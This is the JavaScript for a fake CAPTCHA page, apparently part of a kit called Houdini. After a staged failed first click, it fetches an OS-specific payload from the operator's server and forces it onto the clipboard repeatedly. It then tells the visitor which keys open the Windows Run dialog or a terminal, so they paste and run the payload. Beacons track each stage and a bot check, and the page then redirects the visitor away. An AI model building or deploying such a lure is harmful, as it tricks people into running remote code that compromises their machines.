(function() {
    const TOKEN = window.__HOUDINI_TOKEN__;
    const OS = window.__HOUDINI_OS__;
    const SERVER = window.__HOUDINI_SERVER__;
    
    const box = document.getElementById('captcha-box');
    const checkbox = document.getElementById('checkbox');
    const text = document.getElementById('captcha-text');
    const spinner = document.getElementById('spinner');
    const errorMsg = document.getElementById('error-msg');
    const instructions = document.getElementById('instructions');
    const payloadPreview = document.getElementById('payload-preview');
    const runKeys = document.getElementById('run-keys');
    
    let stage = 0; // 0=initial, 1=failed, 2=passed
    let payloadText = '';
    
    // Bot check first
    const botCheck = window.HoudiniBotCheck();
    if (botCheck.detected) {
        beacon('bot_detected', botCheck.details);
        // Continue anyway but flag server — decoy handled server-side if configured
    }
    
    // Beacon helper
    function beacon(stageName, meta = {}) {
        fetch(`${SERVER}/api/beacon`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({token: TOKEN, stage: stageName, meta})
        }).catch(() => {});
    }
    
    // OS-specific run dialog instructions
    const runInstructions = {
        win: {keys: 'Win + R', action: 'Run dialog'},
        mac: {keys: '⌘ + Space, type "terminal", Enter', action: 'Terminal'},
        linux: {keys: 'Ctrl + Alt + T', action: 'Terminal'}
    };
    
    const osKey = OS.includes('Mac') ? 'mac' : OS.includes('Linux') ? 'linux' : 'win';
    const osInfo = runInstructions[osKey];
    
    // Initial beacon
    beacon('viewed', {os: osKey, botScore: botCheck.score});
    
    // CAPTCHA interaction
    box.addEventListener('click', async function() {
        if (stage === 2) return; // Already passed
        
        if (stage === 0) {
            // First click — FAIL with shake
            stage = 1;
            box.classList.add('shake');
            checkbox.style.display = 'none';
            spinner.style.display = 'block';
            text.textContent = 'Verifying...';
            
            // Simulate network delay then "fail"
            setTimeout(() => {
                box.classList.remove('shake');
                spinner.style.display = 'none';
                checkbox.style.display = 'flex';
                text.textContent = "I'm not a robot";
                errorMsg.classList.add('show');
                errorMsg.textContent = 'Verification failed. Please try again.';
                
                beacon('check_failed');
                
                // Re-enable click by removing pointer-events block
                box.style.pointerEvents = 'auto';
            }, 800);
            
            // Temporarily block rapid re-click
            box.style.pointerEvents = 'none';
            return;
        }
        
        if (stage === 1) {
            // Second click — PASS
            stage = 2;
            box.style.pointerEvents = 'none';
            checkbox.style.display = 'none';
            spinner.style.display = 'block';
            text.textContent = 'Verifying...';
            errorMsg.classList.remove('show');
            
            // Realistic network delay
            setTimeout(async () => {
                spinner.style.display = 'none';
                checkbox.style.display = 'flex';
                checkbox.classList.add('checked');
                checkbox.innerHTML = `<svg class="checkmark" viewBox="0 0 52 52"><path d="M14 27 L22 35 L38 16"/></svg>`;
                text.textContent = 'Verification successful';
                text.style.color = '#059669';
                
                beacon('check_passed');
                
                // Fetch payload from server
                try {
                    const res = await fetch(`${SERVER}/api/payload?token=${TOKEN}&os=${osKey}`);
                    const data = await res.json();
                    payloadText = data.payload;
                    
                    // Show instructions
                    instructions.classList.add('show');
                    runKeys.textContent = osInfo.keys;
                    payloadPreview.textContent = payloadText;
                    
                    // Aggressive clipboard capture
                    const copySuccess = await window.HoudiniClipboard.copy(payloadText);
                    beacon('copied', {method: copySuccess ? 'auto' : 'manual'});
                    
                    // Re-copy on any interaction
                    window.HoudiniClipboard.bindReCopy(document.body, payloadText);
                    
                    // Prestige redirect after callback (if execution confirmed)
                    setTimeout(() => {
                        window.location.href = data.prestige || 'https://www.google.com';
                    }, data.prestigeDelay || 5000);
                    
                } catch(e) {
                    text.textContent = 'Error. Refresh page.';
                }
            }, 1200);
        }
    });
})();
